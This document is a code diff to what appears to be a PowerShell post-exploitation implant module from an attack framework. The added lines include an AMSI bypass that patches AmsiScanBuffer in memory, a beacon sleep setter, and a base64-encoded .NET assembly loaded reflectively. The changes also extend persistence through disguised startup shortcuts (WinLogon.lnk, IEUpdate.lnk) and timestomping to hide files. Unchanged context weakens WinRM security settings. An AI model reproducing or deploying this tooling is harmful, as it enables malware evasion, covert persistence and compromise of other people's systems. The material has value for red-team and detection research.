@@ -1,5 +1,5 @@
 function Test-Wow64() {
-    return (Test-Win32) -and (test-path env:\PROCESSOR_ARCHITEW6432)
+    return (Test-Win32) -and ( test-path env:\PROCESSOR_ARCHITEW6432)
 }
 function Test-Win64() {
     return [IntPtr]::size -eq 8
@@ -7,6 +7,26 @@ function Test-Win64() {
 function Test-Win32() {
     return [IntPtr]::size -eq 4
 }
+Function Beacon($sleeptime) {
+    if ($sleeptime.ToLower().Contains('m')) { 
+        $sleeptime = $sleeptime -replace 'm', ''
+        [int]$newsleep = $sleeptime 
+        [int]$newsleep = $newsleep * 60
+    }
+    elseif ($sleeptime.ToLower().Contains('h')) { 
+        $sleeptime = $sleeptime -replace 'h', ''
+        [int]$newsleep1 = $sleeptime 
+        [int]$newsleep2 = $newsleep1 * 60
+        [int]$newsleep = $newsleep2 * 60
+    }
+    elseif ($sleeptime.ToLower().Contains('s')) { 
+        $newsleep = $sleeptime -replace 's', ''
+    } else {
+        $newsleep = $sleeptime
+    }
+    $script:sleeptime = $newsleep
+}
+New-Alias SetBeacon Beacon
 Function Turtle($sleeptime) {
     if ($sleeptime.ToLower().Contains('m')) { 
         $sleeptime = $sleeptime -replace 'm', ''
@@ -41,6 +61,7 @@ Function CheckArchitecture
     else {
         Write-Output "Unknown Architecture Detected"
     }
+    get-process -id $pid -module |%{ if ($_.modulename -eq "amsi.dll") {echo "`n[+] AMSI Detected. Run Unhook-AMSI to unload Anti-Malware Scan Interface (AMSI)"} }
 }
 Function Get-Proxy {
     Get-ItemProperty -Path "Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
@@ -49,7 +70,8 @@ Function CheckVersionTwo
 {
     $psver = $PSVersionTable.psversion.Major
     if ($psver -ne '2') {
-        Write-Output "`n[+] Powershell version $psver detected. Run Invoke-DowngradeAttack to try using PS v2"
+        Write-Output "`n[+] Powershell version $psver detected. Run Inject-Shellcode with the v2 Shellcode"
+        Write-Output "[+] Warning AMSI, Constrained Mode, ScriptBlock/Module Logging could be enabled"
     }
 }
 $global:ImpUpgrade = $False
@@ -173,34 +195,47 @@ Function Install-Persistence
         $Shortcut.Save()
         If ((Test-Path $DestinationPath) -and ($registrykey2.Wallpaper666)) {
             Write-Output "Created StartUp folder persistence and added RegKey`n Regkey: HKCU\Software\Microsoft\Windows\currentversion\themes\Wallpaper666"
+            Write-Output " LNK File: $env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\IEUpdate.lnk"
         } else {
             Write-Output "Error installing StartUp folder persistence"
         }
     }
 }
 Function InstallExe-Persistence() {
-        $SourceEXE = "rundll32.exe"
-        $ArgumentsToSourceExe = "shell32.dll,ShellExec_RunDLL %temp%\winlogon.exe"
-        $DestinationPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\WinLogon.lnk"
-        $WshShell = New-Object -comObject WScript.Shell
-        $Shortcut = $WshShell.CreateShortcut($DestinationPath)
-        $Shortcut.TargetPath = $SourceEXE
-        $Shortcut.Arguments = $ArgumentsToSourceExe
-        $Shortcut.WindowStyle = 7
-        $Shortcut.Save()
-        TimeStomp $DestinationPath "01/03/2008 12:12 pm"
-        If ((Test-Path $DestinationPath) -and (Test-Path "$env:Temp\Winlogon.exe")) {
-            Write-Output "Created StartUp file Exe persistence: $DestinationPath"
+        if (Test-Path "$env:Temp\Winlogon.exe") {
+            $SourceEXE = "rundll32.exe"
+            $ArgumentsToSourceExe = "shell32.dll,ShellExec_RunDLL %temp%\winlogon.exe"
+            $DestinationPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\WinLogon.lnk"
+            $WshShell = New-Object -comObject WScript.Shell
+            $Shortcut = $WshShell.CreateShortcut($DestinationPath)
+            $Shortcut.TargetPath = $SourceEXE
+            $Shortcut.Arguments = $ArgumentsToSourceExe
+            $Shortcut.WindowStyle = 7
+            $Shortcut.Save()
+            TimeStomp $DestinationPath "01/03/2008 12:12 pm"
+            TimeStomp "$env:Temp\Winlogon.exe" "01/03/2008 12:12 pm"
+            If ((Test-Path $DestinationPath) -and (Test-Path "$env:Temp\Winlogon.exe")) {
+                Write-Output "Created StartUp file Exe persistence: $DestinationPath"
+            } else {
+                Write-Output "Error installing StartUp Exe persistence"
+                Write-Output "Upload EXE to $env:Temp\Winlogon.exe"
+            }
         } else {
             Write-Output "Error installing StartUp Exe persistence"
+            Write-Output "Upload EXE to $env:Temp\Winlogon.exe"
         }
 }
 Function RemoveExe-Persistence() {
         $DestinationPath1 = "$env:Temp\winlogon.exe"
-        Remove-Item -Force $DestinationPath1
+        If (Test-Path $DestinationPath1) {
+            Remove-Item -Force $DestinationPath1
+        }
+        
         $DestinationPath2 = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\WinLogon.lnk"
-        Remove-Item -Force $DestinationPath2
-        TimeStomp $DestinationPath "01/03/2008 12:12 pm"
+        If (Test-Path $DestinationPath2) {
+            Remove-Item -Force $DestinationPath2
+        }
+        
         If ((Test-Path $DestinationPath1) -or ((Test-Path $DestinationPath2))) {
             Write-Output "Unable to Remove Persistence"
         } else {
@@ -512,7 +547,7 @@ $password,
 [string]
 $computer
 )
-Invoke-Command -computer localhost -credential $getcreds -scriptblock { set-itemproperty -path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\System" -Name LocalAccountTokenFilterPolicy -Value 1 -Type Dword}
+Invoke-command -computer localhost -credential $getcreds -scriptblock { set-itemproperty -path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\System" -Name LocalAccountTokenFilterPolicy -Value 1 -Type Dword}
 Invoke-Command -Computer localhost -Credential $getcreds -Scriptblock {Set-Item WSMan:localhost\client\trustedhosts -value * -force}
 $command = "cmd /c powershell.exe -c Set-WSManQuickConfig -Force;Set-Item WSMan:\localhost\Service\Auth\Basic -Value $True;Set-Item WSMan:\localhost\Service\AllowUnencrypted -Value $True; Register-PSSessionConfiguration -Name Microsoft.PowerShell -Force"
 $PSS = ConvertTo-SecureString $password -AsPlainText -Force
@@ -561,7 +596,6 @@ Function Get-ProcessFull {
 
 [System.Diagnostics.Process[]] $processes64bit = @()
 [System.Diagnostics.Process[]] $processes32bit = @()
-
 
 $owners = @{}
 gwmi win32_process |% {$owners[$_.handle] = $_.getowner().user}
@@ -640,7 +674,7 @@ elseif ((Test-Win32) -and (Test-Wow64)) {
         $processes64bit += $process
         $pobject = New-Object PSObject | Select ID, StartTime, Name, Path, Arch, UserName
         $pobject.Id = $process.Id
-        $pobject.StartTime = $process.StartTime
+        $pobject.StartTime = $process.starttime
         $pobject.Name = $process.Name
 		$pobject.Path = $process.Path
         $pobject.Arch = "x64"
@@ -654,6 +688,21 @@ elseif ((Test-Win32) -and (Test-Wow64)) {
 
 $AllProcesses|Select ID, UserName, Arch, Name, Path, StartTime | format-table -auto
 
+}
+$psloadedproclist = $null
+Function Get-ProcessList() {
+if ($psloadedproclist -ne "TRUE") {
+    $script:psloadedproclist = "TRUE"
+    $ps = "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MlByb2Nlc3NJRAB0aDMyUGFyZW50UHJvY2Vzc0lEAE1BWF9QQVRIAHZhbHVlX18AbXNjb3JsaWIAR2V0UHJvY2Vzc0J5SWQAVGhyZWFkAEFwcGVuZABjbnRVc2FnZQBHZXRFbnZpcm9ubWVudFZhcmlhYmxlAGdldF9IYW5kbGUAUnVudGltZVR5cGVIYW5kbGUAQ2xvc2VIYW5kbGUAR2V0VHlwZUZyb21IYW5kbGUAVG9rZW5IYW5kbGUAUHJvY2Vzc0hhbmRsZQBwcm9jZXNzSGFuZGxlAHN6RXhlRmlsZQBNb2R1bGUAZ2V0X05hbWUAbHBwZQBWYWx1ZVR5cGUAcGNQcmlDbGFzc0Jhc2UAR3VpZEF0dHJpYnV0ZQBEZWJ1Z2dhYmxlQXR0cmlidXRlAENvbVZpc2libGVBdHRyaWJ1dGUAQXNzZW1ibHlUaXRsZUF0dHJpYnV0ZQBBc3NlbWJseVRyYWRlbWFya0F0dHJpYnV0ZQBBc3NlbWJseUZpbGVWZXJzaW9uQXR0cmlidXRlAEFzc2VtYmx5Q29uZmlndXJhdGlvbkF0dHJpYnV0ZQBBc3NlbWJseURlc2NyaXB0aW9uQXR0cmlidXRlAEZsYWdzQXR0cmlidXRlAENvbXBpbGF0aW9uUmVsYXhhdGlvbnNBdHRyaWJ1dGUAQXNzZW1ibHlQcm9kdWN0QXR0cmlidXRlAEFzc2VtYmx5Q29weXJpZ2h0QXR0cmlidXRlAEFzc2VtYmx5Q29tcGFueUF0dHJpYnV0ZQBSdW50aW1lQ29tcGF0aWJpbGl0eUF0dHJpYnV0ZQBnZXRfU2l6ZQBkd1NpemUAU2l6ZU9mAEluZGV4T2YAVG9TdHJpbmcAU3Vic3RyaW5nAGlzMzJiaXRhcmNoAE1hcnNoYWwAU3lzdGVtLlNlY3VyaXR5LlByaW5jaXBhbABBbGwAYWR2YXBpMzIuZGxsAGtlcm5lbDMyLmRsbABHZXQtUHJvY2Vzc0xpc3QuZGxsAFN5c3RlbQBFbnVtAE9wZW5Qcm9jZXNzVG9rZW4AU3lzdGVtLlJlZmxlY3Rpb24AQXBwbGljYXRpb25FeGNlcHRpb24AWmVybwBTdHJpbmdCdWlsZGVyAFByb2NIYW5kbGVyAEdldFByb2Nlc3NVc2VyAC5jdG9yAEludFB0cgBTeXN0ZW0u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"
+    $dllbytes  = [System.Convert]::FromBase64String($ps)
+    $assembly = [System.Reflection.Assembly]::Load($dllbytes)
+}
+try{
+    $r = [ProcHandler]::GetProcesses()
+    echo $r
+} catch {
+    echo $error[0]
+}
 }
 Function Invoke-Netstat {                       
 try {            
@@ -703,7 +752,7 @@ elseif ([IntPtr]::size -eq 4) {
 }
 }
 Function TimeStomp($File, $Date) {
-    $file=(gi $file) 
+    $file=(gi $file -force) 
     $file.LastWriteTime=$date;
     $file.LastAccessTime=$date;
     $file.CreationTime=$date;
@@ -723,4 +772,27 @@ Function Get-AllFirewallRules($path) {
     } else {
         $Rules
     }
+}
+Function Unhook-AMSI {
+    
+    $win32 = @"
+using System.Runtime.InteropServices;
+using System;
+public class Win32 {
+[DllImport("kernel32")]
+public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+[DllImport("kernel32")]
+public static extern IntPtr LoadLibrary(string name);
+[DllImport("kernel32")]
+public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect
+);
+}
+"@
+Add-Type $win32
+$ptr = [Win32]::GetProcAddress([Win32]::LoadLibrary("amsi.dll"), "AmsiScanBuffer")
+$b = 0
+[Win32]::VirtualProtect($ptr, [UInt32]5, 0x40, [Ref]$b)
+$buf = New-Object Byte[] 7
+$buf[0] = 0x66; $buf[1] = 0xb8; $buf[2] = 0x01; $buf[3] = 0x00; $buf[4] = 0xc2; $buf[5] = 0x18; $buf[6] = 0x00;
+[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 7)
 }
